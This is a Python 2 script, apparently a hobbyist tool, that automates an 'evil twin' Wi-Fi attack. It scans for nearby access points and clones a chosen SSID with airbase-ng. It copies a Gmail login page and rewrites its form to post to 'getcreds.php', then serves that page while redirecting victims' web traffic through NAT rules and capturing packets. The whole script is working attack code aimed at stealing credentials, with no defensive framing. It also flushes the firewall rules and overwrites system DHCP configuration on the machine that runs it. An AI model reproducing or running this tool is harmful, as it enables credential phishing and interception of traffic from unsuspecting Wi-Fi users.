from scapy.all import *
import os
import time
from subprocess import *

print '*'*20
print '*'*20
print 'Evil Twin Attack Reburn'

import create_db_hotspot
import urllib2, httplib, redirecthandle

####### SET UP A MONITORING INTERFACE
print '*'*20
print 'Creating a monitoring interface'
output = Popen(["iwconfig"], stdout=PIPE).communicate()[0]
wireless_interface = ""
mon_iface = ""
if "wlan" in output:
	#print "The network inteface is: " + output[0:5]
	wireless_interface = output[0:6].strip()
print "\n\n"
print "EVIL TWIN ATTACK"	
print "\n\n"
print "Using wireless interface:::" + wireless_interface
print "\n\n"


mon_interface = Popen(["airmon-ng", "start", wireless_interface], stdout=PIPE).communicate()[0]

if 'mon' in mon_interface:
	print mon_interface[-33:-1].strip()
	mon_iface = mon_interface[-7:-2].strip(")")

print '*'*20
print "SCANNING FOR WIRELESS NETWORKS"
print '*'*20

print "press Ctrl+C to stop scanning"

######## SCAN FOR SSID
app_list = []
def PacketHandler(pkt):
	if pkt.haslayer(Dot11):
		if pkt.type == 0 and pkt.subtype==8:
			if pkt.addr2 not in app_list:
				app_list.append(pkt.addr2)
				print "AP MAC: %s with SSID: %s " %(pkt.addr2, pkt.info)

sniff(iface=mon_iface, prn= PacketHandler)

######## making a backup of DHCPD
print '*'*20
print "making a backup of DHCPD"
os.system("mv /etc/dhcp/dhcpd.conf /etc/dhcp/dhcpd.conf.backup")


##### creating a DHCPD script
print '*'*20
print "creating a DHCPD script"
dhcpd_file = open("/etc/dhcp/dhcpd.conf", "wb")
dhcpd_file.write("authoritative;\ndefault-lease-time 600;\nmax-lease-time 7200;\nsubnet 192.168.1.128 netmask 255.255.255.128 {\n\toption subnet-mask 192.168.1.128;\n\toption broadcast-address 192.168.1.255;\n\toption routers 192.168.1.129;\n\toption domain-name-servers 8.8.8.8;\n\trange 192.168.1.130 192.168.1.140;\n}")


dhcpd_file.close()
# GET USER INPUT FOR SSID

SSID = raw_input('Enter the target SSID: ')
CHANNEL = raw_input('Enter the channel for SSID: ')


################ CONNECT TO WIRELESS NETWORK #########
def connect_wireless():
	os.system("iwconfig "+wireless_interface+" essid " + SSID)

	
	#os.system("sudo iw dev "+wireless_interface+" disconnect")
	print '*'*20
	print 'Connected to :' + SSID + ' on interface ' + wireless_interface
	
	time.sleep(5)
	
	
#######  HANDLE REDIRECT 
def get_login_page():
	
	httplib.HTTPConnection.debuglevel=1
	request = urllib2.Request('https://gmail.com/')
	opener = urllib2.build_opener(redirecthandle.SmartRedirectHandler())
	f = opener.open(request)
	#article = re.sub(r'(?is)</html>.+', '</html>', article)
	redirect = f.url
	#response = urllib2.urlopen('https://google.com')
	html = f.read()
	print "Found the login page here: " + f.url
	########## regex search and replace
	regex = re.search(r'action="([^"]*)".*?', html)
	post_action = str(regex.group(0))
	
	print "*" * 20
	print 'modifying the login page...'
	new_login = html.replace(post_action, 'action=getcreds.php') 
	##### create a login page
	index_page = open('/var/www/index.html','wb')
	index_page.write(new_login)
	index_page.close()
	time.sleep(10)

########## CONNECTING TO THE WIRELESS NETWORK
connect_wireless()

######## getting login page
print '*'*20
print 'Getting login page'
get_login_page()
os.system('firefox http://localhost/index.html &')
# CREATE A HOTSPOT IN A NEW TERMINAL
time.sleep(3)
print '*'*20
print "Creating a hotspot"
os.system("gnome-terminal -x airbase-ng -e '"+SSID+"' -c "+str(CHANNEL)+" -P "+mon_iface+" &")

internet_ip = raw_input('Enter the outbound IP address: ')

print '*'*20
print 'Setting up DHCP Server'
########### SETTING UP THE DHCPD SERVER
os.system("ifconfig at0 up")
os.system("ifconfig at0 192.168.1.129 netmask 255.255.255.128")
os.system("route add -net 192.168.1.128 netmask 255.255.255.128 gw 192.168.1.129")


######### setting up a NAT
print '*'*20
print "setting up a NAT rules\n"
os.system("iptables --flush")
os.system("iptables --table nat --flush")
os.system("iptables --delete-chain")
os.system("iptables --table nat --delete-chain")
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
os.system("iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE")
os.system("iptables --append FORWARD --in-interface at0 -j ACCEPT")


os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination "+internet_ip+":80")
os.system("iptables -t nat -A POSTROUTING -j MASQUERADE")


############# SETTING UP DHCP SERVER
print '*'*20
print 'Setting up DHCP Server for Client'
print '*'*20
time.sleep(3)
os.system("/usr/sbin/dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhcpd.pid at0")
time.sleep(3)
os.system("/etc/init.d/isc-dhcp-server start")


########## CREATING AIRDUMP
print "CREATING AIRDUMP\n"
print '*'*20
os.system("mkdir capture")
os.system("gnome-terminal -x airodump-ng -c "+CHANNEL+" mon0 -w capture/"+SSID)

############# STOP MONITORING INTERFACE
print '*'*20
cancel_command = str(raw_input('Enter quit() to exit the application\n'))


while cancel_command != 'quit()':
		cancel_command = str(raw_input('Enter quit() to exit the application\n'))
print '*'*20
print 'Stopping the monitoring interface'	
os.system("airmon-ng stop " + mon_iface)
os.system("ifconfig at0 down")	
	
	
	






